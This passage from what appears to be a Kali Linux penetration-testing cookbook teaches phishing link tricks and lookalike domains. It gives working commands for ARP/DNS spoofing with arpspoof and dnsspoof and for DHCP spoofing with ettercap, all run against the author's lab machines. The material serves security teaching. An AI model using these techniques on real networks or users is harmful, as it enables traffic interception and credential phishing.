<li>You will get an output with a shortened URL; in my case, it is <kbd>goo.gl/0Dhuon</kbd>. When you enter that into your browser, you will be taken to the original link. </li>
</ol>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">URL manipulation</h1>
                </header>
            
            <article>
                
<p>Know we will manipulate a URL:</p>
<p>From your main Kali screen, open a Firefox browser. <img src="assets/e73a5f30-3efc-48a9-8930-de0e4bda5000.png"/></p>
<p>There is a method of using the @ sign in a URL to help fake the IP address. In your browser, try entering <kbd>http://www.gooogle.com@www.packtpub.com</kbd><span>. Depending on your browser, you may or may not get an error message. For instance, try this in Firefox and then in Chrome. Anything before @ is assumed to be login credentials for the website that follows the @ sign. If the site does not require authentication, you will be taken directly in.</span></p>
<p>At the time of the writing this book, you will get a confirmation in one, and automatically be redirected in the other.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Simple URL link misdirections</h1>
                </header>
            
            <article>
                
<p>We will use a URL link redirection attack:</p>
<ol>
<li>From within Kali, open up a document editor. I will use Google Docs.</li>
<li>Type in a simple phrase such as <kbd>Please signup at facebook.com for the promotion</kbd>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="246" width="1024" class="alignnone size-full wp-image-1039 image-border" src="assets/c4c19a41-489b-4452-9dd2-f34f0aeeef17.png"/></div>
<ol start="3">
<li>Highlight <span class="packt_screen">facebook.com</span> and right-click on it and select <span class="packt_screen">Link... </span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="467" width="680" class="alignnone size-full wp-image-1040 image-border" src="assets/044b3d18-3eed-446a-9e69-55e7c79a2a3e.png"/></div>
<ol start="4">
<li>Enter a different URL for the link address, and click on <span class="packt_screen">Apply</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="233" width="680" class="alignnone size-full wp-image-1041 image-border" src="assets/c0d360b9-36a8-4a17-9bb5-eb8f53577bf6.png"/></div>
<ol start="5">
<li>Now, if the link is clicked, it will forward you to the target website, as opposed to the website displayed:</li>
</ol>
<p><img height="198" width="692" class="alignnone size-full wp-image-1042 image-border" src="assets/3e59f31c-246f-4406-8d7e-3592200a9326.png"/></p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">There's more...</h1>
                </header>
            
            <article>
                
<p>These methods of obfuscation combined with websites, emails, documents, and PDF documents can be extremely tricky for users. Often, they are so quick to click, they don't realize they are being taken to the wrong site. If you combine this with registering domain names that are close to the target domain, they are very often overlooked by the end user.</p>
<p>Take an example of <kbd>google.com</kbd> being redirected to one of the following--<kbd>g00gle.com</kbd>, <kbd>goog1e.com</kbd>, and <kbd>goog1e.com</kbd>. Often these will easily be overlooked by the casual user, and you can have lookalike sites. </p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">DNS spoofing and ARP spoofing</h1>
                </header>
            
            <article>
                
<p>In this recipe, we will discuss how to perform DNS and ARP spoofing. In several of our past recipes, we have shown website attacks that utilize an IP address for the attack—the IP of the Kali machine. However, in real attacks, this may easily be spotted. The whole point of the attack is to make it appear as if they are going to the proper site and making it appear as real as possible. The first part of this process is to perform DNS spoofing.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Let's ensure the following prerequisites:</p>
<ul>
<li>Kali Linux is running, and you are logged in as root</li>
<li>Move the interface from one of your Windows test machines to the NAT network temporarily</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>We will now use ARP spoofing to redirect a user to a fake website:</p>
<ol>
<li>Open up a new terminal window by clicking on the following icon. <img src="assets/5b013ad1-5008-4955-a38b-c5ca4e566e34.png"/></li>
<li>We need to ensure promiscuous mode is on for the interface we are using, and we all need to ensure that IP forwarding is turned on. We need to create a host file to spoof a particular site or set of sites. As we have used a hiking site in several of our testing examples, we will spoof <kbd>us-123hiking.simplesite.com</kbd>, and send it to <kbd>10.0.2.4</kbd>, which is the IP address of my Kali box on <kbd>eth0</kbd>. Enter the following commands:</li>
</ol>
<pre style="padding-left: 60px"><strong>cd </strong><br/><strong>ifconfig eth0 promisc</strong><br/><strong>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</strong><br/><strong>touch fakehost.txt</strong><br/><strong>echo '10.0.2.4 us-123hiking.simplesite.com' &gt; ~/fakehost.txt</strong></pre>
<ol start="3">
<li>Now, we have to basically become a man in the middle; we will do this by ARP spoofing the router IP address (default gateway) of <kbd>10.0.2.1</kbd> and ARP spoofing the victim IP of our Windows machine <kbd>10.0.2.5</kbd>. Then, start <kbd>dnsspoof</kbd> using the host file we just created:</li>
</ol>
<pre style="padding-left: 60px"><strong>arpspoof -t 10.0.2.1 10.0.2.4 &gt; /dev/null 2&gt;&amp;1 &amp; </strong><br/><strong>arpspoof -t 10.0.2.5 10.0.2.4 &gt; /dev/null 2&gt;&amp;1 &amp; </strong><br/><strong>dnsspoof -f ~/fakehost.txt </strong></pre>
<div class="packt_tip">It may take minutes for the ARP spoofing to take place, so be patient; it may help to not start your Windows machine until everything has been set up accordingly. Also, you may want to check that all of the interfaces from a VirtualBox perspective are in a promiscuous mode.</div>
<ol start="4">
<li>Open your Windows test machine, and open a Command Prompt. Enter the following commands. You will note that the hiking site will be pointed to our Kali box:</li>
</ol>
<pre style="padding-left: 60px"><strong>ipconfig /flushdns </strong><br/><strong>ping www.yahoo.com </strong><br/><strong>ping us-123.hiking.simplesite.com </strong></pre>
<div class="CDPAlignCenter CDPAlign"><img height="401" width="696" class="alignnone size-full wp-image-1043 image-border" src="assets/f3bbca7c-bfe0-46e4-80a9-c0e97b09291d.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Windows command ping output</div>
<div class="packt_infobox">Terminate your Kali terminal session, flush the DNS of your Windows machine, and retry the test. You should now be going to the real IP address of <kbd>us-123.hiking.simplesite.com</kbd>.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">DHCP spoofing </h1>
                </header>
            
            <article>
                
<p>In this recipe, you will learn about DHCP spoofing.</p>
<p>DHCP spoofing can be used to route all packets through your Kali box or can be used to push your DNS servers to the hosts on the network. This attack actually has a lot to do with timing. It's important to note that this attack will not always work, as there is the true DHCP server on the network and our DHCP spoofing server. The way DHCP works is that the first response received by the victim is the one it will use irregardless of how many responses it receives. So, the hope is that your response to their request will beat the official DHCP server.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Let's ensure the following prerequisites:</p>
<ul>
<li>Kali Linux is running and you are logged in as root</li>
<li>Windows system is shut down</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>We will now perform DHCP spoofing on the network:</p>
<ol>
<li>Open up a new terminal window by clicking on the following icon. <img src="assets/bb72ead6-52fc-46c7-9b57-1811a54bd079.png"/></li>
<li>We need to ensure promiscuous mode is on for the interface we are using, and we all need to ensure that IP forwarding is turned on. Then we will start <kbd>ettercap</kbd> in the GUI Mode:</li>
</ol>
<pre style="padding-left: 60px"><strong>ifconfig eth0 promisc </strong><br/><strong>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</strong><br/><strong>ettercap -G</strong></pre>
<ol start="3">
<li>From the <kbd>ettercap</kbd> main GUI screen, we want to start sniffing traffic. Click on <span class="packt_screen">Sniff</span> | <span class="packt_screen">Unified sniffing</span>. Then, select the interface we will use. For test purposes, we will use our host-only interface of <kbd>eth1</kbd> and click <span class="packt_screen">OK</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="264" width="409" class="alignnone size-medium wp-image-695 image-border" src="assets/c896a365-e75f-4d01-875d-e9b47c765806.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">ettercap main screen</div>
<ol start="4">
<li>From here, we will have a new option to select <span class="packt_screen">MITM</span><strong> </strong>| <span class="packt_screen">DHCP spoofing...</span> .</li>
<li>Enter an IP pool. In this case, I will use a range on our host-only network of <kbd>192.168.56.100-192.168.56.110</kbd><span>, a subnet mask of</span> <kbd>255.255.255.0</kbd>, <span>and the DNS server address of</span> <kbd>192.168.56.10</kbd>, <span>which is the IP address of my Kali VM. Click</span> on <span class="packt_screen">OK</span><span>:</span></li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img style="text-align: center;color: #333333;font-size: 1em" height="138" width="224" class="alignnone size-medium wp-image-696 image-border" src="assets/4780af25-ab4d-4d5e-b4e7-4a671a1c9dec.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">ettercap mitm dhcp spoofing dialog box</div>
<ol start="6">
<li>Now, start your Windows system, open a Command Prompt, and enter the following. Notice the IP address provided is in the range we specified, and you can also see in <kbd>ettercap</kbd> that the response was provided from there:</li>
</ol>
<pre style="padding-left: 60px"><strong>ipconfig</strong></pre>
<div class="CDPAlignCenter CDPAlign"><img height="356" width="705" class="alignnone size-full wp-image-1044 image-border" src="assets/214201c3-a268-4121-a22d-a2f1d14e93a5.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Windows ipconfig output</div>
<div class="packt_infobox">So a couple of things to note. You will notice that the default gateway is not populated. This is because we do not have a default gateway on the host-only network. Also, since you have no default gateway, you will not forward the traffic off net. </div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">There's more...</h1>
                </header>
            
            <article>
                
<p>This scenario is much easier to test out using physical machines versus virtual machines based on our test environment. If you want to see a better example of this, try connecting your Kali machine on a segment with a physical host that can talk to the internet.</p>


            </article>

            
        </section>
    </body></html>